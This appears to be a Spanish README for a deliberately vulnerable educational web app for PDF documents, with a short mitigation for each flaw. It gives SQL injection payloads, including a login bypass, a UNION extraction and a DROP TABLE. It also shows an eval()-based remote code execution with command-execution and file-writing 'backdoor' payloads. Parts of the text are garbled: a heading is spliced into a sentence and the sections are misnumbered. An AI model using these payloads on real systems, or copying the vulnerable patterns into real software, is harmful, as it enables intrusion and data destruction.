# 📄 Gestor Docs G3

**Aplicación web educativa para demostración de vulnerabilidades de seguridad**

---

## 🎯 **Descripción**

Gestor Docs G3 es una aplicación w### **3. 🚨 Vulnerabilidad RCE (Remote Code Execution)**b de gestión de documentos PDF desarrollada con fines educativos. La aplicación incluye **vulnerabilidades intencionalmente implementadas** para demostrar técnicas de explotación y conceptos de seguridad informática.

⚠️ **ADVERTENCIA**: Esta aplicación contiene vulnerabilidades de seguridad **intencionalmente implementadas** para fines educativos. **NUNCA** usar en producción.

---


### **Estructura del proyecto:**
```
📁 backend/
  📁 api/          # Endpoints modularizados
    📄 auth.js     # Autenticación (VULNERABLE)
    📄 usuarios.js # Gestión usuarios (VULNERABLE)
    📄 documentos.js # Gestión archivos
    📄 comentarios.js # Sistema comentarios
  📁 db/           # Base de datos SQLite
  📁 files/        # Archivos PDF subidos
  📄 server.js     # Servidor Express principal

📁 frontend/
  📁 assets/       # CSS y recursos estáticos
  📁 components/   # Componentes reutilizables
  📁 pages/        # Páginas HTML

📄 init_db.js     # Script inicialización BD
📄 package.json   # Dependencias del proyecto
```

### **Tecnologías:**
- **Backend**: Node.js + Express
- **Base de datos**: SQLite3
- **Frontend**: HTML5 + CSS3 + JavaScript vanilla
- **Autenticación**: Sesiones con cookies
- **Subida archivos**: Multer

---

## 🚀 **Instalación y uso**

### **Requisitos previos:**
- Node.js 16+ 
- npm

### **Pasos de instalación:**

1. **Clonar el repositorio:**
```bash
git clone https://github.com/tu-usuario/segweb-g3-gestor-documentos.git
cd segweb-g3-gestor-documentos
```

2. **Instalar dependencias:**
```bash
npm install
```

3. **Inicializar base de datos:**
```bash
npm run initdb
```

4. **Ejecutar la aplicación:**
```bash
npm start
```

5. **Acceder a la aplicación:**
```
http://localhost:3000
```

### **Usuarios de prueba:**
| Usuario     | Contraseña  | Rol   |
|-------------|-------------|-------|
| admin       | admin123    | admin |
| user        | user123     | user  |
| manager     | manager123  | user  |
| guest       | guest123    | user  |
| superadmin  | super123    | admin |

---

## 🔴 **VULNERABILIDADES IMPLEMENTADAS**

> ⚠️ **Disclaimer**: Las siguientes vulnerabilidades están implementadas **únicamente para fines educativos**. El objetivo es aprender sobre seguridad web y técnicas de explotación en un entorno controlado.

### **1. 💉 SQL Injection**

#### **🎯 Ubicación:**
- **Login** (`/api/auth/login`)
- **Búsqueda de usuarios** (`/api/usuarios/buscar`)

#### **📝 Descripción:**
Las consultas SQL utilizan concatenación directa de strings sin sanitización, permitiendo inyección de código SQL malicioso.

#### **🔓 Código vulnerable:**
```javascript
// Login vulnerable
const query = `SELECT * FROM usuarios WHERE username = '${username}' AND password = '${password}'`;

// Búsqueda vulnerable  
const query = `SELECT * FROM usuarios WHERE username = '${user}'`;
```

#### **💀 Payloads de explotación:**

**Login bypass:**
```sql
Usuario: admin'--
Contraseña: cualquiera
```

**Ver todos los usuarios:**
```sql
Búsqueda: ' OR '1'='1'--
```

**Filtrar por rol admin:**
```sql
Búsqueda: ' OR rol='admin'--
```

**Extraer estructura de la BD:**
```sql
Búsqueda: ' UNION SELECT name, '', '', type FROM sqlite_master WHERE type='table'--
```

**Ver todos los comentarios:**
```sql
Búsqueda: ' UNION SELECT archivo, autor, comentario, 'comentario' FROM comentarios--
```

**Intentar eliminar tabla (puede fallar por permisos):**
```sql
Búsqueda: '; DROP TABLE usuarios; --
```

#### **🛡️ Mitigación:**
Usar consultas parametrizadas:
```javascript
db.get('SELECT * FROM usuarios WHERE username = ? AND password = ?', [username, password], callback);
```

---

### **4. 🔓 Vulnerabilidades de autenticación**

#### **🎯 Ubicación:**
- Sistema de sesiones
- Control de acceso a rutas

#### **📝 Problemas identificados:**
- Sesiones almacenadas en memoria (se pierden al reiniciar)
- No hay expiración de sesiones
- Contraseñas almacenadas en texto plano
- Session ID predecible (uso de crypto básico)

#### **💀 Posibles explotaciones:**
- **Session hijacking** si se obtiene el cookie
- **Fuerza bruta** en contraseñas débiles
- **Escalación de privilegios** modificando rol en sesión

---

### **3. � Vulnerabilidad RCE (Remote Code Execution)**

#### **🎯 Ubicación:**
- Sistema de comentarios (`/api/comentarios`)
- Procesamiento de plantillas en el backend

#### **📝 Descripción:**
El backend procesa los comentarios usando un sistema de plantillas vulnerable que utiliza `eval()` para evaluar expresiones JavaScript. Esto permite que un atacante inyecte código JavaScript malicioso que se ejecutará en el servidor Node.js.

#### **🔓 Código vulnerable:**
```javascript
// Plantilla vulnerable que permite JavaScript injection
function procesarComentario(texto, autor) {
  const template = `
    <div class="comentario">
      <strong>${autor}:</strong> ${texto}
      <small>Fecha: \${new Date().toLocaleString()}</small>
    </div>
  `;
  
  // VULNERABILIDAD: eval() permite ejecución de código JavaScript arbitrario
  return eval('`' + template + '`');
}
```

#### **💀 Explotación paso a paso:**

**Requisito:** Acceso como admin (solo admins pueden comentar)

**Paso 1: Iniciar sesión como admin**
- Usuario: `admin`
- Contraseña: `admin123`

**Paso 2: Ir a "Ver documentos"**
- Seleccionar cualquier archivo
- Usar el formulario de comentarios

**Paso 3: Inyectar payload JavaScript**
- En lugar de un comentario normal, inyectar código malicioso

#### **💀 Payloads de ejemplo:**

**Ejemplo 1: Reconocimiento del sistema**
```javascript
\${process.platform} \${process.version} \${require('os').hostname()}
```

**Ejemplo 2: Ejecución de comandos**
```javascript
\${require('child_process').execSync('whoami').toString()}
```

**Ejemplo 3: Listado de archivos**
```javascript
\${require('fs').readdirSync('.').join(', ')}
```

**Ejemplo 4: Creación de archivo**
```javascript
\${require('fs').writeFileSync('hacked.txt', 'Sistema comprometido!')}
```

**Ejemplo 5: Backdoor para Windows**
```javascript
\${require('fs').writeFileSync('backdoor.bat', '@echo off\\necho === BACKDOOR ACTIVO ===\\nwhoami\\nhostname\\nipconfig\\ndir C:\\\\Users\\npause')} \${require('child_process').exec('backdoor.bat')}
```

#### **🔍 Explicación del Ejemplo 5:**
Este payload es especialmente peligroso porque:
1. **Crea un archivo .bat** con comandos de reconocimiento del sistema
2. **Lo ejecuta automáticamente** en el servidor Windows
3. **Recopila información** como usuario actual, nombre del equipo, configuración de red
4. **Lista directorios** para mapear la estructura del sistema
5. **Deja una pausa** para poder ver la salida antes de que se cierre

El archivo `backdoor.bat` creado contiene:
```batch
@echo off
echo === BACKDOOR ACTIVO ===
whoami
hostname
ipconfig
dir C:\Users
pause
```

#### **🛡️ Mitigación:**
```javascript
// NUNCA usar eval() con datos de usuario
// Usar sanitización y escape de HTML
function procesarComentario(texto, autor) {
  const textoEscapado = texto.replace(/[<>&"']/g, (char) => {
    return {'<': '&lt;', '>': '&gt;', '&': '&amp;', '"': '&quot;', "'": '&#x27;'}[char];
  });
  
  return `
    <div class="comentario">
      <strong>${autor}:</strong> ${textoEscapado}
      <small>Fecha: ${new Date().toLocaleString()}</small>
    </div>
  `;
}
```

---

### **4. �📂 Vulnerabilidades de subida de archivos**

#### **🎯 Ubicación:**
- Endpoint `/api/documentos/upload`

#### **📝 Problemas identificados:**
- Validación solo por MIME type (bypasseable)
- No hay validación de contenido del archivo
- Archivos almacenados con nombre original
- Falta límite de tasa de subida

#### **💀 Posibles explotaciones:**
- Subir archivos maliciosos con extensión PDF
- Path traversal en nombres de archivo
- DoS por subida masiva de archivos

---

### **5. 🌐 Exposición de información**

#### **🎯 Ubicación:**
- Búsqueda de usuarios devuelve contraseñas
- Logs del servidor muestran consultas SQL
- Errores de BD expuestos al frontend

#### **💀 Información expuesta:**
- Contraseñas en texto plano
- Estructura de la base de datos
- Detalles técnicos en errores


